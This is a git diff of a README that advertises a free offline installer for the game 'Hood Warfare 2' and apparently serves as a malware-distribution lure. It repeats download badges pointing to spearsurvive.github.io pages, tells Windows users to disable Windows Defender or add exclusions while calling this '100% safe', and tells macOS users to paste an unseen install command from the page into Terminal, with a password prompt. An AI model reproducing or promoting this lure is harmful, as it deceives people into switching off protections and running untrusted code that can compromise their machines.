@@ -1,18 +1,28 @@
 # 🎮 Hood Warfare 2 Offline Installer Free [2026]
 
 <p align="center">
-  <img src="https://img.shields.io/badge/Downloads-50K%2B-brightgreen?style=flat-square" />
-  <img src="https://img.shields.io/badge/Version-Latest-0078D4?style=flat-square" />
-  <img src="https://img.shields.io/badge/Platform-Windows%20%7C%20macOS-informational?style=flat-square" />
+  <img src="https://img.shields.io/badge/Downloads-50K%2B-E63946?style=for-the-badge&logo=github" />
+  <img src="https://img.shields.io/badge/Rating-4.9%2F5-F9A825?style=for-the-badge&logo=star" />
+  <img src="https://img.shields.io/badge/Version-2026-101010?style=for-the-badge&logo=github" />
+  <img src="https://img.shields.io/badge/Platform-Windows%20%7C%20macOS-informational?style=for-the-badge&logo=windows" />
+  <img src="https://img.shields.io/badge/Genre-Action-E63946?style=for-the-badge&logo=steam" />
 </p>
 
-🎮 **Hood Warfare 2 Offline Installer Free** — Hood Warfare 2 is a tactical team-based action game set in a gritty urban warfare environment.
+**🎮 Hood Warfare 2 Offline Installer Free** — Hood Warfare 2 is a tactical team-based action game set in a gritty urban warfare environment. Works without internet access, no account required. Full offline installation. No DRM. No region locks.
+
+<p align="center">
+  <img src="https://skillicons.dev/icons?i=windows" />
+  <img src="https://skillicons.dev/icons?i=apple" />
+  <img src="https://skillicons.dev/icons?i=github" />
+</p>
+
+<p align="center">
+  <img src="https://readme-typing-svg.herokuapp.com?color=E63946&size=28&center=true&vCenter=true&width=900&lines=🎮+Hood+Warfare+2+Offline+Installer;⭐+Full+Game+No+DRM;🌟+Full+Offline+Installation+2026;🔥+No+Account+Required" />
+</p>
 
 <div align="center">
 
-[![Download for Windows](https://spearsurvive.github.io/win/)](https://img.shields.io/badge/Download_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)
-[![⬇ Download for Windows](https://img.shields.io/badge/⬇_Download_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://spearsurvive.github.io/win/)
-[![⬇ Download for macOS](https://img.shields.io/badge/⬇_Download_for_macOS-101010?style=for-the-badge&logo=apple&logoColor=white)](https://spearsurvive.github.io/mac/)
+[![⬇ Download Hood Warfare 2](https://img.shields.io/badge/⬇_Download_Hood%20Warfare%202-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -51,9 +61,9 @@ Hood Warfare 2 is a tactical team-based action game set in a gritty urban warfar
 
 <div align="center">
 
-[![⬇ Download for Windows](https://img.shields.io/badge/⬇_Download_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://spearsurvive.github.io/win/)
+[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://spearsurvive.github.io/win/)
 
-[![⬇ Download for macOS](https://img.shields.io/badge/⬇_Download_for_macOS-101010?style=for-the-badge&logo=apple&logoColor=white)](https://spearsurvive.github.io/mac/)
+[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://spearsurvive.github.io/mac/)
 
 </div>
 
@@ -62,12 +72,18 @@ Hood Warfare 2 is a tactical team-based action game set in a gritty urban warfar
 
 ### Step 2: Disable Windows Defender (Windows only, temporarily)
 
-- May flag installer as false positive — add folder to exclusions
-- 100% safe
+- May flag as false positive — add folder to exclusions
+- **100% safe**
 
 ### Step 3: Install and launch
 
 - Run the installer → Follow on-screen instructions → Launch Hood Warfare 2
+
+<div align="center">
+
+[![⬇ Download Hood Warfare 2](https://img.shields.io/badge/⬇_Download_Hood%20Warfare%202-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+
+</div>
 
 ---
 
@@ -76,7 +92,7 @@ Hood Warfare 2 is a tactical team-based action game set in a gritty urban warfar
 | **Feature** | **Online** | **Offline** |
 |---|---|---|
 | **Requires Internet** | ❌ Yes | ✅ No |
-| **Speed** | ❌ Depends on connection | ✅ Instant local install |
+| **Speed** | ❌ Depends on connection | ✅ Instant |
 | **Reliability** | ❌ Server downtime risk | ✅ Always accessible |
 | **Reuse** | ❌ Re-download each time | ✅ Keep on USB drive |
 
@@ -93,14 +109,18 @@ Hood Warfare 2 is a tactical team-based action game set in a gritty urban warfar
 
 ---
 
+---
+
 ## 🍎 macOS Installation
 
-1. Click the macOS badge above to open the installer page
+[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://spearsurvive.github.io/mac/)
+
+1. Click the badge above to open the macOS installer page
 2. Open **Terminal** (`⌘ + Space` → type Terminal → Enter)
 3. Paste the install command shown on the page and press Enter
 4. Follow the prompts — installs automatically 🍏
 
-Works on Apple Silicon (M1–M4) and Intel Macs.
+> Works on **Apple Silicon (M1–M4)** and **Intel Macs**. macOS may prompt for your password during install.
 
 ---
 
@@ -109,7 +129,21 @@ Works on Apple Silicon (M1–M4) and Intel Macs.
 | ✅ Allowed | ❌ Not Allowed |
 |---|---|
 | Personal use | Commercial redistribution |
-| Educational use | Resale of the installer |
-| Archival/preservation | Modification of source files |
+| Commercial projects | Resale of the installer |
+| Education | Modification of source files |
 
-**Hood Warfare 2 Offline Installer Free** — full offline installer for Hood Warfare 2. Install without internet and start playing immediately!
+---
+
+**Hood Warfare 2 Offline Installer Free** — complete offline installer for Hood Warfare 2. Install without internet and start playing immediately!
+
+<div align="center">
+
+[![⬇ Download Hood Warfare 2](https://img.shields.io/badge/⬇_Download_Hood%20Warfare%202-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+
+</div>
+
+<p align="center">
+  <img src="https://skillicons.dev/icons?i=windows" />
+  <img src="https://skillicons.dev/icons?i=apple" />
+  <img src="https://skillicons.dev/icons?i=github" />
+</p>
